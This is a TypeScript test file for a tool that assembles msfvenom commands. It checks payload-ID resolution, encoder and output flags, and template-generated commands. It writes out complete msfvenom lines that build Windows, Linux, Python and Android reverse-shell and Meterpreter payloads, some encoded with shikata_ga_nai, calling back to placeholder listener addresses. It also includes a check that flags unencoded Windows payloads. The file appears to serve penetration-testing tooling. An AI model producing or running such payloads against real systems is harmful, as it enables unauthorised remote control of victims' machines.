import { describe, expect, it } from "vitest";
import { MSFVENOM_ENCODERS_BY_ID, NONE_ENCODER, encodersForArch } from "./encoders";
import { MSFVENOM_FORMATS_BY_ID } from "./formats";
import { MSFVENOM_PAYLOADS_BY_ID } from "./payloads";
import { MSFVENOM_TEMPLATES } from "./templates";
import {
  buildBashVariable,
  buildCommand,
  buildListenerParamsOnly,
  hasNoEncoderRisk,
  MsfvenomSelection,
  requiresOutputFilename,
  resolvePayloadId,
  suggestFilename,
} from "./generate";

const windowsMeterpreter = MSFVENOM_PAYLOADS_BY_ID["windows/meterpreter/reverse_tcp"];
const linuxShell = MSFVENOM_PAYLOADS_BY_ID["linux/{arch}/shell_reverse_tcp"];
const pythonPayload = MSFVENOM_PAYLOADS_BY_ID["python/meterpreter/reverse_tcp"];
const androidMeterpreter = MSFVENOM_PAYLOADS_BY_ID["android/meterpreter/reverse_tcp"];
const exeFormat = MSFVENOM_FORMATS_BY_ID.exe;
const elfFormat = MSFVENOM_FORMATS_BY_ID.elf;
const rawFormat = MSFVENOM_FORMATS_BY_ID.raw;
const pyFormat = MSFVENOM_FORMATS_BY_ID.py;
const shikata = MSFVENOM_ENCODERS_BY_ID["x86/shikata_ga_nai"];

function baseSelection(overrides: Partial<MsfvenomSelection>): MsfvenomSelection {
  return {
    payload: windowsMeterpreter,
    arch: "x86",
    format: exeFormat,
    encoder: NONE_ENCODER,
    iterations: 0,
    lhost: "10.10.10.10",
    lport: 4444,
    exitfunc: "thread",
    filename: "payload.exe",
    extraOptions: "",
    ...overrides,
  };
}

describe("resolvePayloadId", () => {
  it("substitutes {arch} for path-segment payloads, including the default arch", () => {
    expect(resolvePayloadId(linuxShell, "x64")).toBe("linux/x64/shell_reverse_tcp");
    expect(resolvePayloadId(linuxShell, "x86")).toBe("linux/x86/shell_reverse_tcp");
  });

  it("leaves flag-only payload ids untouched regardless of arch", () => {
    expect(resolvePayloadId(pythonPayload, null)).toBe("python/meterpreter/reverse_tcp");
  });

  it("windows-arch-segment payloads stay flat for x86 (msfvenom's implicit module)", () => {
    expect(resolvePayloadId(windowsMeterpreter, "x86")).toBe("windows/meterpreter/reverse_tcp");
  });

  it("windows-arch-segment payloads insert an explicit x64/ segment for x64 (a genuinely separate module)", () => {
    expect(resolvePayloadId(windowsMeterpreter, "x64")).toBe("windows/x64/meterpreter/reverse_tcp");
  });
});

describe("suggestFilename", () => {
  it("appends arch suffix for executable formats", () => {
    expect(suggestFilename(windowsMeterpreter, exeFormat, "x64")).toBe("meterpreter_reverse_x64.exe");
  });

  it("omits arch suffix and extension for extension-less/no-arch formats", () => {
    expect(suggestFilename(pythonPayload, pyFormat, null)).toBe("reverse_shell.py");
  });
});

describe("buildCommand", () => {
  it("omits -e/-i together when encoder is none", () => {
    const cmd = buildCommand(baseSelection({}));
    expect(cmd).not.toContain("-e ");
    expect(cmd).not.toContain("-i ");
  });

  it("includes -e and -i with the exact iteration count when an encoder is set", () => {
    const cmd = buildCommand(baseSelection({ encoder: shikata, iterations: 3 }));
    expect(cmd).toContain("-e x86/shikata_ga_nai -i 3");
  });

  it("omits -a for path-segment payloads (arch is baked into -p)", () => {
    const cmd = buildCommand(baseSelection({ payload: linuxShell, arch: "x64", format: elfFormat, exitfunc: null, filename: "shell.elf" }));
    expect(cmd).toContain("-p linux/x64/shell_reverse_tcp");
    expect(cmd).not.toContain(" -a ");
  });

  it("omits -a for windows-arch-segment payloads too (arch is baked into -p, not passed via -a)", () => {
    const cmd = buildCommand(baseSelection({ arch: "x64" }));
    expect(cmd).toContain("-p windows/x64/meterpreter/reverse_tcp");
    expect(cmd).not.toContain(" -a ");
  });

  it("omits -a entirely when arch is null", () => {
    const cmd = buildCommand(baseSelection({ payload: pythonPayload, arch: null, format: pyFormat, exitfunc: null, filename: "s.py" }));
    expect(cmd).not.toContain(" -a ");
  });

  it("omits -o when the format doesn't produce a file", () => {
    const cmd = buildCommand(baseSelection({ format: rawFormat }));
    expect(cmd).not.toContain("-o");
  });

  it("includes -o as the last token otherwise", () => {
    const cmd = buildCommand(baseSelection({ filename: "out.exe" }));
    expect(cmd.endsWith("-o out.exe")).toBe(true);
  });

  it("includes EXITFUNC only when set", () => {
    expect(buildCommand(baseSelection({ exitfunc: "thread" }))).toContain("EXITFUNC=thread");
    expect(buildCommand(baseSelection({ exitfunc: null }))).not.toContain("EXITFUNC");
  });

  it("inserts trimmed extra options verbatim just before -o", () => {
    const cmd = buildCommand(baseSelection({ extraOptions: "  AutoLoadingUser=true  " }));
    expect(cmd).toContain("AutoLoadingUser=true -o payload.exe");
  });

  it("omits extra options when blank", () => {
    const cmd = buildCommand(baseSelection({ extraOptions: "   " }));
    expect(cmd).not.toContain("  -o"); // no double space from an empty inserted token
  });

  it("produces the exact expected string for a full example", () => {
    const cmd = buildCommand(
      baseSelection({ encoder: shikata, iterations: 2, arch: "x86", lhost: "192.168.1.100", lport: 4444, filename: "payload.exe" }),
    );
    expect(cmd).toBe(
      "msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -i 2 LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -o payload.exe",
    );
  });

  it("includes -o for Android even though its format (raw) doesn't normally produce a file, and omits -a (no real Android arch value)", () => {
    const cmd = buildCommand(
      baseSelection({
        payload: androidMeterpreter,
        arch: null,
        format: rawFormat,
        exitfunc: null,
        filename: "meterpreter_reverse.apk",
      }),
    );
    expect(cmd).toContain("-f raw");
    expect(cmd).not.toContain(" -a ");
    expect(cmd.endsWith("-o meterpreter_reverse.apk")).toBe(true);
  });
});

describe("requiresOutputFilename", () => {
  it("is true for formats that produce a file", () => {
    expect(requiresOutputFilename(windowsMeterpreter, exeFormat)).toBe(true);
  });

  it("is false for raw/console-dump formats on ordinary payloads", () => {
    expect(requiresOutputFilename(windowsMeterpreter, rawFormat)).toBe(false);
  });

  it("is true for Android even with the raw format, since forceOutputFilename is set", () => {
    expect(requiresOutputFilename(androidMeterpreter, rawFormat)).toBe(true);
  });
});

describe("buildBashVariable / buildListenerParamsOnly", () => {
  it("wraps the command as a bash variable", () => {
    expect(buildBashVariable("msfvenom -p x")).toBe('CMD="msfvenom -p x"\n$CMD');
  });

  it("returns exactly LHOST=x LPORT=y regardless of other fields", () => {
    expect(buildListenerParamsOnly(baseSelection({ lhost: "1.2.3.4", lport: 9999 }))).toBe("LHOST=1.2.3.4 LPORT=9999");
  });
});

describe("hasNoEncoderRisk", () => {
  it("is true only for windows + none encoder", () => {
    expect(hasNoEncoderRisk(windowsMeterpreter, NONE_ENCODER)).toBe(true);
    expect(hasNoEncoderRisk(windowsMeterpreter, shikata)).toBe(false);
    expect(hasNoEncoderRisk(linuxShell, NONE_ENCODER)).toBe(false);
  });
});

describe("template -> command generation", () => {
  const fixtureHost = { lhost: "10.10.10.10", lport: 4444 };

  it.each(MSFVENOM_TEMPLATES)("generates a well-formed command for template $id", (template) => {
    const payload = MSFVENOM_PAYLOADS_BY_ID[template.payloadId];
    const format = MSFVENOM_FORMATS_BY_ID[template.formatId];
    const encoder = MSFVENOM_ENCODERS_BY_ID[template.encoderId];

    const selection: MsfvenomSelection = {
      payload,
      arch: template.archId,
      format,
      encoder,
      iterations: template.iterations,
      lhost: fixtureHost.lhost,
      lport: fixtureHost.lport,
      exitfunc: template.exitfunc,
      filename: template.filename,
      extraOptions: "",
    };

    const cmd = buildCommand(selection);
    expect(cmd).toContain(`-p ${resolvePayloadId(payload, template.archId)}`);
    expect(cmd).toContain(`-f ${template.formatId}`);
    expect(cmd).toContain("LHOST=10.10.10.10 LPORT=4444");
    if (template.encoderId !== "none") {
      expect(cmd).toContain(`-e ${template.encoderId} -i ${template.iterations}`);
    }
    if (requiresOutputFilename(payload, format)) {
      expect(cmd.endsWith(`-o ${template.filename}`)).toBe(true);
    } else {
      expect(cmd).not.toContain("-o");
    }
  });

  it.each(MSFVENOM_TEMPLATES)("template $id's encoder is valid for its own architecture", (template) => {
    const payload = MSFVENOM_PAYLOADS_BY_ID[template.payloadId];
    const validIds = encodersForArch(template.archId).map((e) => e.id);
    expect(validIds, `${template.id}: ${template.encoderId} not valid for arch ${template.archId}`).toContain(template.encoderId);
    expect(payload.compatibleFormats, `${template.id}: ${template.formatId} not compatible with ${payload.id}`).toContain(
      template.formatId,
    );
  });
});
